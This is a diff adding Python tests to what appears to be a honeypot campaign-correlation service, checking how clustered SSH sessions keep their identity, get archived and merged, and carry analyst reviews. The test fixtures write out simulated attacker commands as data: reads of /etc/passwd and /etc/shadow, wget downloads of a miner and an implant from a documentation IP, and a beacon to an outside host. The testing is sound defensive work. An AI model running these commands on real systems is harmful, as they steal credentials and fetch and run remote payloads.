@@ -496,3 +496,260 @@ def test_expiry_retires_a_relationship_without_erasing_its_evidence(client):
     assert evidence["components"] == original["components"]
     assert evidence["explanation"] == original["explanation"]
     assert evidence["expired_at"]
+
+
+def _feedback(client, headers, campaign_id: str, label: str, note: str = "") -> dict:
+    response = client.post(
+        "/api/v1/feedback",
+        headers=headers,
+        json={"object_type": "campaign", "object_id": campaign_id, "label": label, "note": note},
+    )
+    assert response.status_code == 201, response.text
+    return response.json()
+
+
+def test_campaign_identity_survives_membership_growth(client, sensor_headers, admin_headers):
+    """An added session must not produce a new campaign and orphan the review."""
+    commands = [
+        "uname -a",
+        "cat /etc/passwd",
+        "wget http://198.51.100.9/xmrig",
+        "chmod +x xmrig",
+        "./xmrig -o stratum+tcp://pool:3333",
+    ]
+    for index in range(2):
+        _ingest(
+            client,
+            sensor_headers,
+            _ssh_events(
+                session_id=f"sess-grow-{index}",
+                ip=f"203.0.113.{111 + index}",
+                commands=commands,
+                usernames=["root", "admin"],
+                start_minutes=70 - index,
+                indicators=["ja3:grow"],
+            ),
+        )
+    client.post("/api/v1/correlate", json={}, headers=admin_headers)
+    campaign = next(item for item in _campaigns(client, admin_headers) if item["member_count"] == 2)
+    original_id = campaign["id"]
+    _feedback(client, admin_headers, original_id, "supported", "Seen in the same intrusion window.")
+
+    _ingest(
+        client,
+        sensor_headers,
+        _ssh_events(
+            session_id="sess-grow-2",
+            ip="203.0.113.113",
+            commands=commands,
+            usernames=["root", "admin"],
+            start_minutes=60,
+            indicators=["ja3:grow"],
+        ),
+    )
+    client.post("/api/v1/correlate", json={}, headers=admin_headers)
+
+    detail = client.get(f"/api/v1/campaigns/{original_id}", headers=admin_headers).json()
+    assert detail["campaign"]["member_count"] == 3
+    assert detail["campaign"]["status"] == "confirmed"
+    assert detail["campaign"]["status_updated_at"]
+    assert "sess-grow-2" in detail["evidence"]["sessions"]
+    assert detail["evidence"]["membership_history"][-1]["added"] == ["sess-grow-2"]
+
+    listed = next(
+        item for item in _campaigns(client, admin_headers) if item["id"] == original_id
+    )
+    assert listed["member_count"] == 3
+    overview = client.get("/api/v1/feedback", headers=admin_headers).json()
+    assert overview["recent"][0]["object_id"] == original_id
+
+
+def test_reviewed_campaign_is_archived_when_its_links_disappear(client, sensor_headers, admin_headers):
+    """Disappearing evidence must not delete the record of an analyst's decision."""
+    from sqlalchemy import text
+
+    from app.db.database import connection
+
+    commands = ["uname -a", "id", "wget http://198.51.100.9/tool", "chmod +x tool"]
+    for index in range(2):
+        _ingest(
+            client,
+            sensor_headers,
+            _ssh_events(
+                session_id=f"sess-archive-{index}",
+                ip=f"203.0.113.{121 + index}",
+                commands=commands,
+                usernames=["root"],
+                start_minutes=80 - index,
+                indicators=["ja3:archive"],
+            ),
+        )
+    client.post("/api/v1/correlate", json={}, headers=admin_headers)
+    campaign = next(item for item in _campaigns(client, admin_headers) if item["member_count"] == 2)
+    _feedback(client, admin_headers, campaign["id"], "rejected", "Separate maintenance activity.")
+
+    with connection() as conn:
+        conn.execute(text("DELETE FROM events"))
+        conn.execute(
+            text(
+                "UPDATE graph_edges SET expires_at = '2000-01-01T00:00:00+00:00' "
+                "WHERE kind = 'session_similarity'"
+            )
+        )
+    run = client.post("/api/v1/correlate", json={}, headers=admin_headers)
+    assert run.status_code == 200
+    assert run.json()["campaigns_archived"] == 1
+
+    assert not any(item["id"] == campaign["id"] for item in _campaigns(client, admin_headers))
+    archived = client.get(
+        "/api/v1/campaigns?include_archived=true", headers=admin_headers
+    ).json()["items"]
+    record = next(item for item in archived if item["id"] == campaign["id"])
+    assert record["status"] == "rejected"
+    assert record["archived_at"]
+
+    detail = client.get(f"/api/v1/campaigns/{campaign['id']}", headers=admin_headers)
+    assert detail.status_code == 200
+    assert detail.json()["campaign"]["archived"] is True
+    overview = client.get("/api/v1/feedback", headers=admin_headers).json()
+    assert overview["counts"]["campaign"]["rejected"] == 1
+
+    # The relationship can return.  When it does, the review returns with it
+    # rather than a fresh identity being minted beside the archived one.
+    for index in range(2):
+        _ingest(
+            client,
+            sensor_headers,
+            _ssh_events(
+                session_id=f"sess-archive-{index}",
+                ip=f"203.0.113.{121 + index}",
+                commands=commands,
+                usernames=["root"],
+                start_minutes=70 - index,
+                indicators=["ja3:archive"],
+            ),
+        )
+    client.post("/api/v1/correlate", json={}, headers=admin_headers)
+    restored = next(
+        item for item in _campaigns(client, admin_headers) if item["id"] == campaign["id"]
+    )
+    assert restored["status"] == "rejected"
+    assert restored["archived_at"] is None
+    history = client.get(
+        f"/api/v1/campaigns/{campaign['id']}", headers=admin_headers
+    ).json()["evidence"]["membership_history"]
+    assert history[-1]["event"] == "reactivated"
+
+
+def _seed_merge_state(client, sensor_headers, admin_headers) -> tuple[str, str]:
+    """Two reviewed campaigns whose sessions now share one toolkit.
+
+    The campaign rows stand in for the previous correlation run, which had
+    produced two separate two-session clusters.  The telemetry now supports a
+    single four-session cluster, so the next run has to merge the identities.
+    """
+    from app.core.security import iso, utcnow
+    from app.db.database import connection, dumps
+    from app.db.schema import campaigns
+
+    commands = [
+        "uname -a",
+        "cat /etc/shadow",
+        "wget http://198.51.100.9/implant",
+        "chmod +x implant",
+        "./implant --beacon 192.0.2.80:443",
+    ]
+    counter = 0
+    for group in ("a", "b"):
+        for index in range(2):
+            counter += 1
+            _ingest(
+                client,
+                sensor_headers,
+                _ssh_events(
+                    session_id=f"sess-merge-{group}-{index}",
+                    ip=f"203.0.113.{140 + counter}",
+                    commands=commands,
+                    usernames=["svc-merge"],
+                    start_minutes=90 - counter,
+                    client="SSH-2.0-merge",
+                    indicators=["ja3:merge"],
+                ),
+            )
+    now = utcnow()
+    with connection() as conn:
+        for group in ("a", "b"):
+            members = [f"sess-merge-{group}-0", f"sess-merge-{group}-1"]
+            conn.execute(
+                campaigns.insert().values(
+                    id=f"cmp_merge_{group}",
+                    name=f"candidate {group}",
+                    status="candidate",
+                    confidence=0.9,
+                    summary="prior run",
+                    evidence=dumps({"sessions": members, "ips": [], "edges": []}),
+                    created_at=iso(now),
+                    updated_at=iso(now),
+                    algorithm_version=ALGORITHM_VERSION,
+                    member_count=2,
+                    ip_count=2,
+                )
+            )
+    return "cmp_merge_a", "cmp_merge_b"
+
+
+def test_merged_campaigns_carry_the_analyst_decision(client, sensor_headers, admin_headers):
+    survivor_id, absorbed_id = _seed_merge_state(client, sensor_headers, admin_headers)
+    _feedback(client, admin_headers, absorbed_id, "rejected", "Unrelated scanner noise.")
+
+    client.post("/api/v1/correlate", json={}, headers=admin_headers)
+
+    merged = next(
+        item for item in _campaigns(client, admin_headers) if item["member_count"] == 4
+    )
+    assert merged["id"] == survivor_id
+    assert merged["status"] == "rejected"
+    archived = client.get(
+        "/api/v1/campaigns?include_archived=true", headers=admin_headers
+    ).json()["items"]
+    absorbed = next(item for item in archived if item["id"] == absorbed_id)
+    assert absorbed["superseded_by"] == survivor_id
+    assert absorbed["archived_at"]
+    survivor = client.get(f"/api/v1/campaigns/{survivor_id}", headers=admin_headers).json()
+    carried = [
+        entry
+        for entry in survivor["evidence"].get("review_history", [])
+        if entry["event"] == "status_carried"
+    ]
+    assert carried and carried[-1]["to"] == "rejected"
+    overview = client.get("/api/v1/feedback", headers=admin_headers).json()
+    assert overview["recent"][0]["object_id"] == survivor_id
+
+    # A late review submitted against the absorbed identifier is recorded on
+    # the survivor, and the response says where it was redirected from.
+    late = _feedback(client, admin_headers, absorbed_id, "uncertain", "Reviewed after the merge.")
+    assert late["object_id"] == survivor_id
+    assert late["redirected_from"] == absorbed_id
+
+
+def test_conflicting_merged_reviews_become_uncertain(client, sensor_headers, admin_headers):
+    survivor_id, absorbed_id = _seed_merge_state(client, sensor_headers, admin_headers)
+    _feedback(client, admin_headers, survivor_id, "supported", "Confirmed from the ticket.")
+    _feedback(client, admin_headers, absorbed_id, "rejected", "Unrelated scanner noise.")
+
+    client.post("/api/v1/correlate", json={}, headers=admin_headers)
+
+    merged = next(
+        item for item in _campaigns(client, admin_headers) if item["member_count"] == 4
+    )
+    assert merged["status"] == "uncertain"
+    survivor = client.get(f"/api/v1/campaigns/{survivor_id}", headers=admin_headers).json()
+    carried = [
+        entry
+        for entry in survivor["evidence"].get("review_history", [])
+        if entry["event"] == "status_carried"
+    ]
+    assert carried
+    assert carried[-1]["to"] == "uncertain"
+    overview = client.get("/api/v1/feedback", headers=admin_headers).json()
+    assert {item["object_id"] for item in overview["recent"]} == {survivor_id}
